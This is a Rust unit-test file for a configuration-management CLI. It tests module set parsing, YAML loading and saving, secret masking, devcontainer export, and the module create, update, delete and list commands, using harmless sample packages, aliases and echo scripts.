use super::*;

fn make_module_doc(packages: Vec<config::ModulePackageEntry>) -> config::ModuleDocument {
    config::ModuleDocument {
        api_version: cfgd_core::API_VERSION.to_string(),
        kind: "Module".to_string(),
        metadata: config::ModuleMetadata {
            name: "test".to_string(),
            description: None,
        },
        spec: config::ModuleSpec {
            packages,
            ..Default::default()
        },
    }
}

fn make_pkg(name: &str) -> config::ModulePackageEntry {
    config::ModulePackageEntry {
        name: name.to_string(),
        ..Default::default()
    }
}

use cfgd_core::test_helpers::test_printer as make_printer;

// --- apply_module_sets ---

#[test]
fn apply_set_min_version() {
    let mut doc = make_module_doc(vec![make_pkg("curl")]);
    apply_module_sets(&["package.curl.minVersion=7.0".into()], &mut doc).unwrap();
    assert_eq!(doc.spec.packages[0].min_version.as_deref(), Some("7.0"));
}

#[test]
fn apply_set_prefer() {
    let mut doc = make_module_doc(vec![make_pkg("curl")]);
    apply_module_sets(&["package.curl.prefer=brew,cargo".into()], &mut doc).unwrap();
    assert_eq!(doc.spec.packages[0].prefer, vec!["brew", "cargo"]);
}

#[test]
fn apply_set_platforms() {
    let mut doc = make_module_doc(vec![make_pkg("curl")]);
    apply_module_sets(&["package.curl.platforms=linux,macos".into()], &mut doc).unwrap();
    assert_eq!(doc.spec.packages[0].platforms, vec!["linux", "macos"]);
}

#[test]
fn apply_set_deny() {
    let mut doc = make_module_doc(vec![make_pkg("curl")]);
    apply_module_sets(&["package.curl.deny=snap".into()], &mut doc).unwrap();
    assert_eq!(doc.spec.packages[0].deny, vec!["snap"]);
}

#[test]
fn apply_set_script() {
    let mut doc = make_module_doc(vec![make_pkg("curl")]);
    apply_module_sets(&["package.curl.script=install.sh".into()], &mut doc).unwrap();
    assert_eq!(doc.spec.packages[0].script.as_deref(), Some("install.sh"));
}

#[test]
fn apply_set_alias() {
    let mut doc = make_module_doc(vec![make_pkg("vim")]);
    apply_module_sets(&["package.vim.alias.brew=neovim".into()], &mut doc).unwrap();
    assert_eq!(doc.spec.packages[0].aliases.get("brew").unwrap(), "neovim");
}

#[test]
fn apply_set_invalid_no_equals() {
    let mut doc = make_module_doc(vec![make_pkg("curl")]);
    let err = apply_module_sets(&["noequals".into()], &mut doc).unwrap_err();
    assert!(
        err.to_string().contains("expected key=value"),
        "unexpected error: {err}"
    );
}

#[test]
fn apply_set_invalid_path_too_short() {
    let mut doc = make_module_doc(vec![make_pkg("curl")]);
    let err = apply_module_sets(&["foo=bar".into()], &mut doc).unwrap_err();
    assert!(
        err.to_string().contains("expected package."),
        "unexpected error: {err}"
    );
}

#[test]
fn apply_set_unknown_field() {
    let mut doc = make_module_doc(vec![make_pkg("curl")]);
    let err = apply_module_sets(&["package.curl.unknown=val".into()], &mut doc).unwrap_err();
    assert!(
        err.to_string().contains("Unknown package field"),
        "unexpected error: {err}"
    );
}

#[test]
fn apply_set_package_not_found() {
    let mut doc = make_module_doc(vec![make_pkg("curl")]);
    let err = apply_module_sets(&["package.vim.minVersion=9.0".into()], &mut doc).unwrap_err();
    assert!(
        err.to_string().contains("not found in module"),
        "unexpected error: {err}"
    );
}

// --- load_module_document ---

#[test]
fn load_module_document_valid() {
    let dir = tempfile::tempdir().unwrap();
    let module_dir = dir.path().join("modules").join("test-mod");
    std::fs::create_dir_all(&module_dir).unwrap();
    let yaml = "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: test-mod\nspec:\n  packages:\n    - name: curl\n";
    std::fs::write(module_dir.join("module.yaml"), yaml).unwrap();

    let (doc, path) = load_module_document(dir.path(), "test-mod").unwrap();
    assert_eq!(doc.metadata.name, "test-mod");
    assert_eq!(doc.spec.packages.len(), 1);
    assert!(path.ends_with("module.yaml"));
}

#[test]
fn load_module_document_missing_dir() {
    let dir = tempfile::tempdir().unwrap();
    let err = load_module_document(dir.path(), "nope").unwrap_err();
    assert!(
        err.to_string().contains("not found"),
        "unexpected error: {err}"
    );
}

#[test]
fn load_module_document_missing_yaml() {
    let dir = tempfile::tempdir().unwrap();
    let module_dir = dir.path().join("modules").join("empty-mod");
    std::fs::create_dir_all(&module_dir).unwrap();
    let err = load_module_document(dir.path(), "empty-mod").unwrap_err();
    assert!(
        err.to_string().contains("not found"),
        "unexpected error: {err}"
    );
}

// --- save_module_document ---

#[test]
fn save_and_reload_module() {
    let dir = tempfile::tempdir().unwrap();
    let module_dir = dir.path().join("modules").join("roundtrip");
    std::fs::create_dir_all(&module_dir).unwrap();
    let path = module_dir.join("module.yaml");

    let doc = make_module_doc(vec![make_pkg("ripgrep")]);
    save_module_document(&doc, &path).unwrap();

    let (loaded, _) = load_module_document(dir.path(), "roundtrip").unwrap();
    assert_eq!(loaded.spec.packages[0].name, "ripgrep");
}

// --- profiles_using_module ---

#[test]
fn profiles_using_module_no_dir() {
    let result = profiles_using_module(Path::new("/nonexistent-12345"), "test").unwrap();
    assert!(result.is_empty());
}

#[test]
fn profiles_using_module_no_match() {
    let dir = tempfile::tempdir().unwrap();
    let yaml = "apiVersion: cfgd.io/v1alpha1\nkind: Profile\nmetadata:\n  name: work\nspec:\n  inherits: []\n  modules:\n    - other-mod\n";
    std::fs::write(dir.path().join("work.yaml"), yaml).unwrap();

    let result = profiles_using_module(dir.path(), "test-mod").unwrap();
    assert!(result.is_empty());
}

#[test]
fn profiles_using_module_match_found() {
    let dir = tempfile::tempdir().unwrap();
    let yaml = "apiVersion: cfgd.io/v1alpha1\nkind: Profile\nmetadata:\n  name: work\nspec:\n  inherits: []\n  modules:\n    - test-mod\n";
    std::fs::write(dir.path().join("work.yaml"), yaml).unwrap();

    let result = profiles_using_module(dir.path(), "test-mod").unwrap();
    assert_eq!(result, vec!["work"]);
}

// --- mask_value ---

#[test]
fn mask_value_long_string() {
    assert_eq!(mask_value("my-secret-token"), "***ken");
}

#[test]
fn mask_value_short_string() {
    assert_eq!(mask_value("abc"), "***");
    assert_eq!(mask_value("ab"), "***");
    assert_eq!(mask_value(""), "***");
}

#[test]
fn mask_value_four_chars() {
    assert_eq!(mask_value("abcd"), "***bcd");
}

// --- export_devcontainer ---

#[test]
fn export_devcontainer_creates_files() {
    let config_dir = tempfile::tempdir().unwrap();
    let mod_dir = config_dir.path().join("modules").join("test-tool");
    std::fs::create_dir_all(&mod_dir).unwrap();
    std::fs::write(
        mod_dir.join("module.yaml"),
        r#"apiVersion: cfgd.io/v1alpha1
kind: Module
metadata:
  name: test-tool
spec:
  packages:
    - name: curl
    - name: jq
  env:
    - name: EDITOR
      value: vim
"#,
    )
    .unwrap();

    let output_dir = tempfile::tempdir().unwrap();
    let printer = make_printer();
    let cli = super::Cli {
        command: Some(super::Command::Status {
            module: None,
            exit_code: false,
        }),
        config: config_dir.path().join("cfgd.yaml"),
        profile: None,
        verbose: 0,
        quiet: true,
        no_color: false,
        output: super::OutputFormatArg(cfgd_core::output::OutputFormat::Table),
        list_envelope: false,
        jsonpath: None,
        state_dir: None,
        config_dir: None,
        cache_dir: None,
        runtime_dir: None,
        system: false,
    };

    let result = super::export_devcontainer(
        &cli,
        &printer,
        "test-tool",
        Some(output_dir.path().to_str().unwrap()),
    );
    assert!(result.is_ok(), "export failed: {:?}", result);

    let feature_dir = output_dir.path().join("test-tool");
    assert!(feature_dir.join("install.sh").exists());
    assert!(feature_dir.join("devcontainer-feature.json").exists());

    let install = std::fs::read_to_string(feature_dir.join("install.sh")).unwrap();
    assert!(install.contains("apt-get install"));
    assert!(install.contains("curl"));
    assert!(install.contains("jq"));
    assert!(install.contains("EDITOR"));

    let feature_json =
        std::fs::read_to_string(feature_dir.join("devcontainer-feature.json")).unwrap();
    let parsed: serde_json::Value = serde_json::from_str(&feature_json).unwrap();
    assert_eq!(parsed["id"], "test-tool");
    assert!(parsed["options"]["EDITOR"].is_object());
}

// ─── helpers for harness-style tests ────────────────────────

fn test_cli(dir: &std::path::Path) -> super::Cli {
    super::Cli {
        command: Some(super::Command::Status {
            module: None,
            exit_code: false,
        }),
        config: dir.join("cfgd.yaml"),
        profile: None,
        verbose: 0,
        quiet: true,
        no_color: true,
        output: super::OutputFormatArg(cfgd_core::output::OutputFormat::Table),
        list_envelope: false,
        jsonpath: None,
        state_dir: None,
        config_dir: None,
        cache_dir: None,
        runtime_dir: None,
        system: false,
    }
}

fn test_cli_json(dir: &std::path::Path) -> super::Cli {
    super::Cli {
        output: super::OutputFormatArg(cfgd_core::output::OutputFormat::Json),
        ..test_cli(dir)
    }
}

fn setup_config_dir() -> tempfile::TempDir {
    let dir = tempfile::tempdir().unwrap();
    let profiles_dir = dir.path().join("profiles");
    std::fs::create_dir_all(&profiles_dir).unwrap();
    std::fs::write(
            profiles_dir.join("default.yaml"),
            "apiVersion: cfgd.io/v1alpha1\nkind: Profile\nmetadata:\n  name: default\nspec:\n  modules: []\n",
        ).unwrap();
    std::fs::write(
            dir.path().join("cfgd.yaml"),
            "apiVersion: cfgd.io/v1alpha1\nkind: Config\nmetadata:\n  name: t\nspec:\n  profile: default\n",
        ).unwrap();
    std::fs::create_dir_all(dir.path().join("modules")).unwrap();
    dir
}

fn make_module(dir: &std::path::Path, name: &str, yaml: &str) {
    let mod_dir = dir.join("modules").join(name);
    std::fs::create_dir_all(mod_dir.join("files")).unwrap();
    std::fs::write(mod_dir.join("module.yaml"), yaml).unwrap();
}

const RICH_MODULE_YAML: &str = r#"apiVersion: cfgd.io/v1alpha1
kind: Module
metadata:
  name: devtools
  description: Dev tools module
spec:
  depends:
    - base
  packages:
    - name: ripgrep
    - name: fd-find
  files:
    - source: files/config.toml
      target: ~/.config/app/config.toml
  env:
    - name: EDITOR
      value: nvim
  aliases:
    - name: ll
      command: ls -la
  scripts:
    postApply:
      - echo done
"#;

// ─── cmd_module_list ────────────────────────────────────────

#[test]
fn cmd_module_list_empty() {
    let dir = setup_config_dir();
    let cli = test_cli(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);

    cmd_module_list(&cli, &printer).unwrap();
    drop(printer);

    let output = buf.lock().unwrap();
    assert!(
        output.contains("No modules found"),
        "should report no modules, got: {output}"
    );
}

#[test]
fn cmd_module_list_shows_modules() {
    let dir = setup_config_dir();
    make_module(
        dir.path(),
        "alpha",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: alpha\nspec:\n  packages:\n    - name: curl\n",
    );
    make_module(
        dir.path(),
        "beta",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: beta\nspec:\n  packages: []\n",
    );

    let cli = test_cli(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);

    cmd_module_list(&cli, &printer).unwrap();
    drop(printer);

    let output = buf.lock().unwrap();
    assert!(output.contains("alpha"), "should list alpha, got: {output}");
    assert!(output.contains("beta"), "should list beta, got: {output}");
}

#[test]
fn cmd_module_list_json_empty() {
    let dir = setup_config_dir();
    let cli = test_cli_json(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_with_format(cfgd_core::output::OutputFormat::Json);

    cmd_module_list(&cli, &printer).unwrap();
    drop(printer);

    let output = buf.lock().unwrap();
    let json: serde_json::Value = serde_json::from_str(output.trim()).unwrap();
    assert!(json.is_array());
    assert_eq!(json.as_array().unwrap().len(), 0);
}

#[test]
fn cmd_module_list_json_with_modules() {
    let dir = setup_config_dir();
    make_module(
        dir.path(),
        "alpha",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: alpha\nspec:\n  packages:\n    - name: curl\n    - name: vim\n",
    );

    let cli = test_cli_json(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_with_format(cfgd_core::output::OutputFormat::Json);

    cmd_module_list(&cli, &printer).unwrap();
    drop(printer);

    let output = buf.lock().unwrap();
    let json: serde_json::Value = serde_json::from_str(output.trim()).unwrap();
    assert!(json.is_array());
    let arr = json.as_array().unwrap();
    assert_eq!(arr.len(), 1);
    assert_eq!(arr[0]["name"], "alpha");
    assert_eq!(arr[0]["packages"], 2);
    assert_eq!(arr[0]["source"], "local");
}

// ─── cmd_module_show ────────────────────────────────────────

#[test]
fn cmd_module_show_not_found() {
    let dir = setup_config_dir();
    let cli = test_cli(dir.path());
    let (printer, _buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);

    let err = cmd_module_show(&cli, &printer, "ghost", false).unwrap_err();
    assert!(
        err.to_string().contains("not found"),
        "should report not found, got: {err}"
    );
}

#[test]
fn cmd_module_show_displays_details() {
    let dir = setup_config_dir();
    make_module(dir.path(), "devtools", RICH_MODULE_YAML);
    // Create the source file so the file entry is valid
    std::fs::write(
        dir.path().join("modules/devtools/files/config.toml"),
        "# config",
    )
    .unwrap();

    let cli = test_cli(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);

    cmd_module_show(&cli, &printer, "devtools", false).unwrap();
    drop(printer);

    let output = buf.lock().unwrap();
    assert!(
        output.contains("Module: devtools"),
        "should show module header, got: {output}"
    );
    assert!(
        output.contains("base"),
        "should show dependencies, got: {output}"
    );
    assert!(
        output.contains("local"),
        "should show source as local, got: {output}"
    );
    assert!(
        output.contains("Packages"),
        "should have packages section, got: {output}"
    );
}

#[test]
fn cmd_module_show_with_available_hint() {
    let dir = setup_config_dir();
    make_module(
        dir.path(),
        "existing",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: existing\nspec:\n  packages: []\n",
    );

    let cli = test_cli(dir.path());
    let (printer, _buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);

    let err = cmd_module_show(&cli, &printer, "missing", false).unwrap_err();
    drop(printer);
    let meta = err
        .downcast_ref::<crate::cli::CliErrorMeta>()
        .expect("handler returns CliErrorMeta");
    assert_eq!(meta.error_kind, "not_found");
    assert!(
        meta.hints.iter().any(|h| h.contains("existing")),
        "should hint available modules, got: {:?}",
        meta.hints
    );
    assert!(
        meta.extras["available"]
            .as_array()
            .is_some_and(|a| a.iter().any(|v| v == "existing")),
        "available list must include the existing module: {:?}",
        meta.extras
    );
    assert!(
        err.to_string().contains("not found"),
        "should report not found, got: {err}"
    );
}

#[test]
fn cmd_module_show_env_masking() {
    let dir = setup_config_dir();
    let yaml = "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: secrets-mod\nspec:\n  env:\n    - name: API_KEY\n      value: super-secret-token\n";
    make_module(dir.path(), "secrets-mod", yaml);

    let cli = test_cli(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);

    cmd_module_show(&cli, &printer, "secrets-mod", false).unwrap();
    drop(printer);
    let output = buf.lock().unwrap();
    assert!(
        output.contains("***"),
        "env values should be masked, got: {output}"
    );
    assert!(
        !output.contains("super-secret-token"),
        "actual value should not appear when masked, got: {output}"
    );
}

#[test]
fn cmd_module_show_env_unmasked() {
    let dir = setup_config_dir();
    let yaml = "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: env-mod\nspec:\n  env:\n    - name: GREETING\n      value: hello-world\n";
    make_module(dir.path(), "env-mod", yaml);

    let cli = test_cli(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);

    cmd_module_show(&cli, &printer, "env-mod", true).unwrap();
    drop(printer);
    let output = buf.lock().unwrap();
    assert!(
        output.contains("hello-world"),
        "actual value should appear with show_values=true, got: {output}"
    );
}

#[test]
fn cmd_module_show_json_schema() {
    let dir = setup_config_dir();
    make_module(
        dir.path(),
        "jmod",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: jmod\nspec:\n  packages:\n    - name: bat\n",
    );

    let cli = test_cli_json(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_with_format(cfgd_core::output::OutputFormat::Json);

    cmd_module_show(&cli, &printer, "jmod", false).unwrap();
    drop(printer);

    let output = buf.lock().unwrap();
    let json: serde_json::Value = serde_json::from_str(output.trim()).unwrap();
    assert!(json.get("name").is_some(), "JSON should have name field");
    assert_eq!(json["name"], "jmod");
    assert!(
        json.get("directory").is_some(),
        "JSON should have directory field"
    );
    assert!(
        json.get("source").is_some(),
        "JSON should have source field"
    );
    assert_eq!(json["source"], "local");
    assert!(json.get("spec").is_some(), "JSON should have spec field");
}

// ─── local test factory helpers ──────────────────────────────

fn make_module_update_args(name: &str) -> super::ModuleUpdateArgs {
    super::ModuleUpdateArgs {
        name: name.to_string(),
        packages: vec![],
        files: vec![],
        env: vec![],
        aliases: vec![],
        depends: vec![],
        post_apply: vec![],
        private: false,
        description: None,
        sets: vec![],
    }
}

fn make_module_create_args(name: &str) -> super::ModuleCreateArgs {
    super::ModuleCreateArgs {
        name: name.to_string(),
        description: None,
        depends: vec![],
        packages: vec![],
        files: vec![],
        env: vec![],
        aliases: vec![],
        private: false,
        post_apply: vec![],
        sets: vec![],
        apply: false,
        yes: false,
    }
}

// ─── cmd_module_update_local — env, aliases, deps, scripts ─

#[test]
fn cmd_module_update_add_env() {
    let dir = tempfile::tempdir().unwrap();
    make_module(
        dir.path(),
        "mod1",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: mod1\nspec:\n  packages: []\n",
    );

    let cli = test_cli(dir.path());
    let printer = make_printer();

    let args = super::ModuleUpdateArgs {
        env: vec!["EDITOR=nvim".to_string()],
        ..make_module_update_args("mod1")
    };
    cmd_module_update_local(&cli, &printer, &args).unwrap();

    let (doc, _) = load_module_document(dir.path(), "mod1").unwrap();
    assert_eq!(doc.spec.env.len(), 1);
    assert_eq!(doc.spec.env[0].name, "EDITOR");
    assert_eq!(doc.spec.env[0].value, "nvim");
}

#[test]
fn cmd_module_update_remove_env() {
    let dir = tempfile::tempdir().unwrap();
    make_module(
        dir.path(),
        "mod1",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: mod1\nspec:\n  env:\n    - name: EDITOR\n      value: vim\n    - name: PAGER\n      value: less\n",
    );

    let cli = test_cli(dir.path());
    let printer = make_printer();

    let args = super::ModuleUpdateArgs {
        env: vec!["-EDITOR".to_string()],
        ..make_module_update_args("mod1")
    };
    cmd_module_update_local(&cli, &printer, &args).unwrap();

    let (doc, _) = load_module_document(dir.path(), "mod1").unwrap();
    assert_eq!(doc.spec.env.len(), 1);
    assert_eq!(doc.spec.env[0].name, "PAGER");
}

#[test]
fn cmd_module_update_add_alias() {
    let dir = tempfile::tempdir().unwrap();
    make_module(
        dir.path(),
        "mod1",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: mod1\nspec:\n  packages: []\n",
    );

    let cli = test_cli(dir.path());
    let printer = make_printer();

    let args = super::ModuleUpdateArgs {
        aliases: vec!["ll=ls -la".to_string()],
        ..make_module_update_args("mod1")
    };
    cmd_module_update_local(&cli, &printer, &args).unwrap();

    let (doc, _) = load_module_document(dir.path(), "mod1").unwrap();
    assert_eq!(doc.spec.aliases.len(), 1);
    assert_eq!(doc.spec.aliases[0].name, "ll");
    assert_eq!(doc.spec.aliases[0].command, "ls -la");
}

#[test]
fn cmd_module_update_remove_alias() {
    let dir = tempfile::tempdir().unwrap();
    make_module(
        dir.path(),
        "mod1",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: mod1\nspec:\n  aliases:\n    - name: ll\n      command: ls -la\n    - name: gs\n      command: git status\n",
    );

    let cli = test_cli(dir.path());
    let printer = make_printer();

    let args = super::ModuleUpdateArgs {
        aliases: vec!["-ll".to_string()],
        ..make_module_update_args("mod1")
    };
    cmd_module_update_local(&cli, &printer, &args).unwrap();

    let (doc, _) = load_module_document(dir.path(), "mod1").unwrap();
    assert_eq!(doc.spec.aliases.len(), 1);
    assert_eq!(doc.spec.aliases[0].name, "gs");
}

#[test]
fn cmd_module_update_add_depends() {
    let dir = tempfile::tempdir().unwrap();
    make_module(
        dir.path(),
        "mod1",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: mod1\nspec:\n  packages: []\n",
    );

    let cli = test_cli(dir.path());
    let printer = make_printer();

    let args = super::ModuleUpdateArgs {
        depends: vec!["base".to_string(), "core".to_string()],
        ..make_module_update_args("mod1")
    };
    cmd_module_update_local(&cli, &printer, &args).unwrap();

    let (doc, _) = load_module_document(dir.path(), "mod1").unwrap();
    assert_eq!(doc.spec.depends, vec!["base", "core"]);
}

#[test]
fn cmd_module_update_remove_depends() {
    let dir = tempfile::tempdir().unwrap();
    make_module(
        dir.path(),
        "mod1",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: mod1\nspec:\n  depends:\n    - base\n    - core\n",
    );

    let cli = test_cli(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);

    let args = super::ModuleUpdateArgs {
        depends: vec!["-base".to_string()],
        ..make_module_update_args("mod1")
    };
    cmd_module_update_local(&cli, &printer, &args).unwrap();

    let (doc, _) = load_module_document(dir.path(), "mod1").unwrap();
    assert_eq!(doc.spec.depends, vec!["core"]);

    let output = buf.lock().unwrap();
    assert!(
        output.contains("Removed dependency: base"),
        "should confirm removal, got: {output}"
    );
}

#[test]
fn cmd_module_update_add_post_apply_script() {
    let dir = tempfile::tempdir().unwrap();
    make_module(
        dir.path(),
        "mod1",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: mod1\nspec:\n  packages: []\n",
    );

    let cli = test_cli(dir.path());
    let printer = make_printer();

    let args = super::ModuleUpdateArgs {
        post_apply: vec!["echo hello".to_string()],
        ..make_module_update_args("mod1")
    };
    cmd_module_update_local(&cli, &printer, &args).unwrap();

    let (doc, _) = load_module_document(dir.path(), "mod1").unwrap();
    let scripts = doc.spec.scripts.unwrap();
    assert_eq!(scripts.post_apply.len(), 1);
    assert_eq!(scripts.post_apply[0].run_str(), "echo hello");
}

#[test]
fn cmd_module_update_remove_post_apply_script() {
    let dir = tempfile::tempdir().unwrap();
    make_module(
        dir.path(),
        "mod1",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: mod1\nspec:\n  scripts:\n    postApply:\n      - echo hello\n      - echo bye\n",
    );

    let cli = test_cli(dir.path());
    let printer = make_printer();

    let args = super::ModuleUpdateArgs {
        post_apply: vec!["-echo hello".to_string()],
        ..make_module_update_args("mod1")
    };
    cmd_module_update_local(&cli, &printer, &args).unwrap();

    let (doc, _) = load_module_document(dir.path(), "mod1").unwrap();
    let scripts = doc.spec.scripts.unwrap();
    assert_eq!(scripts.post_apply.len(), 1);
    assert_eq!(scripts.post_apply[0].run_str(), "echo bye");
}

#[test]
fn cmd_module_update_description() {
    let dir = tempfile::tempdir().unwrap();
    make_module(
        dir.path(),
        "mod1",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: mod1\nspec:\n  packages: []\n",
    );

    let cli = test_cli(dir.path());
    let printer = make_printer();

    let args = super::ModuleUpdateArgs {
        description: Some("Updated description".to_string()),
        ..make_module_update_args("mod1")
    };
    cmd_module_update_local(&cli, &printer, &args).unwrap();

    let (doc, _) = load_module_document(dir.path(), "mod1").unwrap();
    assert_eq!(
        doc.metadata.description,
        Some("Updated description".to_string())
    );
}

#[test]
fn cmd_module_update_no_changes_reports() {
    let dir = tempfile::tempdir().unwrap();
    make_module(
        dir.path(),
        "mod1",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: mod1\nspec:\n  packages: []\n",
    );

    let cli = test_cli(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);

    let args = make_module_update_args("mod1");
    cmd_module_update_local(&cli, &printer, &args).unwrap();

    let output = buf.lock().unwrap();
    assert!(
        output.contains("No changes specified"),
        "should report no changes, got: {output}"
    );
}

#[test]
fn cmd_module_update_nonexistent_fails() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::create_dir_all(dir.path().join("modules")).unwrap();

    let cli = test_cli(dir.path());
    let printer = make_printer();

    let args = make_module_update_args("ghost");
    let err = cmd_module_update_local(&cli, &printer, &args).unwrap_err();
    assert!(
        err.to_string().contains("not found"),
        "should report not found, got: {err}"
    );
}

#[test]
fn cmd_module_update_json_absent_reports_not_found() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::create_dir_all(dir.path().join("modules")).unwrap();

    let cli = test_cli_json(dir.path());
    let (printer, _cap) = cfgd_core::output::Printer::for_test_doc();

    let args = make_module_update_args("ghost");
    let err = cmd_module_update_local(&cli, &printer, &args).unwrap_err();
    drop(printer);

    let meta = err
        .downcast_ref::<crate::cli::CliErrorMeta>()
        .expect("handler returns CliErrorMeta");
    assert_eq!(
        meta.error_kind, "not_found",
        "an absent module is genuinely not-found, got: {}",
        meta.error_kind
    );
}

#[test]
fn cmd_module_update_json_malformed_reports_parse_failed() {
    let dir = tempfile::tempdir().unwrap();
    // module.yaml exists but has a duplicate key — a parse error, NOT not-found.
    make_module(
        dir.path(),
        "broken",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: broken\n  name: broken\nspec:\n  packages: []\n",
    );

    let cli = test_cli_json(dir.path());
    let (printer, _cap) = cfgd_core::output::Printer::for_test_doc();

    let args = super::ModuleUpdateArgs {
        packages: vec!["ripgrep".to_string()],
        ..make_module_update_args("broken")
    };
    let err = cmd_module_update_local(&cli, &printer, &args).unwrap_err();
    drop(printer);

    let meta = err
        .downcast_ref::<crate::cli::CliErrorMeta>()
        .expect("handler returns CliErrorMeta");
    assert_eq!(
        meta.error_kind, "parse_failed",
        "a present-but-malformed module.yaml is a parse failure, got: {}",
        meta.error_kind
    );
    // Exit-code survival: the inner typed CfgdError must remain downcastable
    // through the context wrap so main.rs resolves the parse exit code (4).
    assert!(
        err.downcast_ref::<cfgd_core::errors::CfgdError>().is_some(),
        "inner CfgdError must survive the cli_error_ctx wrap"
    );
}

#[test]
fn cmd_module_update_add_files_with_duplicate_basename_bails() {
    let dir = tempfile::tempdir().unwrap();
    make_module(
        dir.path(),
        "mod1",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: mod1\nspec:\n  packages: []\n",
    );
    // Two distinct source files, same basename — must be rejected so
    // they don't silently overwrite each other in the module's files/ dir.
    let src_dir = tempfile::tempdir().unwrap();
    let a = src_dir.path().join("a");
    let b = src_dir.path().join("b");
    std::fs::create_dir_all(&a).unwrap();
    std::fs::create_dir_all(&b).unwrap();
    let f1 = a.join("conflict.toml");
    let f2 = b.join("conflict.toml");
    std::fs::write(&f1, b"first").unwrap();
    std::fs::write(&f2, b"second").unwrap();

    let cli = test_cli(dir.path());
    let printer = make_printer();
    let args = super::ModuleUpdateArgs {
        files: vec![f1.display().to_string(), f2.display().to_string()],
        ..make_module_update_args("mod1")
    };
    let err = cmd_module_update_local(&cli, &printer, &args).unwrap_err();
    let msg = err.to_string();
    assert!(
        msg.contains("Duplicate file basename") && msg.contains("conflict.toml"),
        "must bail with the offending basename so the user fixes the conflict: {msg}"
    );
}

// ─── cmd_module_create — non-interactive flags ─────────────

#[test]
fn cmd_module_create_with_env_and_aliases() {
    let dir = setup_config_dir();
    let cli = test_cli(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);

    let args = super::ModuleCreateArgs {
        description: Some("Test module".to_string()),
        env: vec!["EDITOR=nvim".to_string()],
        aliases: vec!["ll=ls -la".to_string()],
        ..make_module_create_args("env-mod")
    };
    cmd_module_create(&cli, &printer, &args).unwrap();
    drop(printer);

    let (doc, _) = load_module_document(dir.path(), "env-mod").unwrap();
    assert_eq!(doc.spec.env.len(), 1);
    assert_eq!(doc.spec.env[0].name, "EDITOR");
    assert_eq!(doc.spec.aliases.len(), 1);
    assert_eq!(doc.spec.aliases[0].name, "ll");

    let output = buf.lock().unwrap();
    assert!(
        output.contains("Created module 'env-mod'"),
        "should confirm creation, got: {output}"
    );
}

#[test]
fn cmd_module_create_with_depends_and_scripts() {
    let dir = setup_config_dir();
    let cli = test_cli(dir.path());
    let printer = make_printer();

    let args = super::ModuleCreateArgs {
        depends: vec!["base".to_string()],
        post_apply: vec!["echo setup".to_string()],
        ..make_module_create_args("dep-mod")
    };
    cmd_module_create(&cli, &printer, &args).unwrap();

    let (doc, _) = load_module_document(dir.path(), "dep-mod").unwrap();
    assert_eq!(doc.spec.depends, vec!["base"]);
    assert!(doc.spec.scripts.is_some());
    let scripts = doc.spec.scripts.unwrap();
    assert_eq!(scripts.post_apply.len(), 1);
}

#[test]
fn cmd_module_create_invalid_name_fails() {
    let dir = setup_config_dir();
    let cli = test_cli(dir.path());
    let printer = make_printer();

    let args = make_module_create_args(".bad-name");
    let err = cmd_module_create(&cli, &printer, &args).unwrap_err();
    assert!(
        err.to_string().contains("cannot start with"),
        "should reject invalid name, got: {err}"
    );
}

// ─── cmd_module_delete — edge cases ────────────────────────

#[test]
fn cmd_module_delete_nonexistent_fails() {
    let dir = setup_config_dir();
    let cli = test_cli(dir.path());
    let printer = make_printer();

    let err = cmd_module_delete(&cli, &printer, "ghost", true, false, false).unwrap_err();
    assert!(
        err.to_string().contains("not found"),
        "should report not found, got: {err}"
    );
}

#[test]
fn cmd_module_delete_invalid_name_fails() {
    let dir = setup_config_dir();
    let cli = test_cli(dir.path());
    let printer = make_printer();

    let err = cmd_module_delete(&cli, &printer, "-bad", true, false, false).unwrap_err();
    assert!(
        err.to_string().contains("cannot start with"),
        "should reject invalid name, got: {err}"
    );
}

// ─── cmd_module_registry_add ────────────────────────────────

